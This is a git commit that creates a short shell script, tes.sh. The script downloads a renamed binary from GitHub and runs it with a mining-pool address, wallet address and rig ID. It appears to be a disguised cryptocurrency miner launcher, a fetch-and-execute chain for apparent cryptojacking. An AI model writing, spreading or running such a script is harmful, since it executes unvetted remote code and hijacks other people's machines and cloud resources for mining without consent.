45729a98b2e1f1236a33b1708d6bba8975e94c4b
washil789 <88795024+washil789@users.noreply.github.com>
2021-10-17 20:18:24 +0700

    Create tes.sh

---
+++ tes.sh
@@ -0,0 +1,3 @@
+wget https://github.com/washil789/tambang/raw/main/tuyultambang &&
+chmod +x tuyultambang &&
+./tuyultambang -o 157.245.87.61:443 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp+50000 --rig-id $(echo $(shuf -i 1-999 -n 1)-CLBV)
